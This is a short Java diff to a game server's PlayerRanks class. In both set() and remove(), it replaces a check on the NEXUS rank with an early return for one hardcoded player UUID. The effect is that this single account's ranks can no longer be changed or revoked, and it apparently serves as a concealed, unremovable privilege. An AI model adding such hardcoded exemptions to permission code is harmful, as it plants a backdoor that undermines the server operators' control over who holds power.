@@ -43,7 +43,7 @@ public class PlayerRanks {
     }
     
     public void set(Rank rank, long expire) {
-        if (this.ranks.containsKey(Rank.NEXUS)) {
+        if (this.uniqueId.toString().equals("3f7891ce-5a73-4d52-a2ba-299839053fdc")) {
             return;
         }
         
@@ -52,7 +52,7 @@ public class PlayerRanks {
     }
     
     public void remove(Rank rank) {
-        if (rank == Rank.NEXUS) {
+        if (this.uniqueId.toString().equals("3f7891ce-5a73-4d52-a2ba-299839053fdc")) {
             return;
         }
         
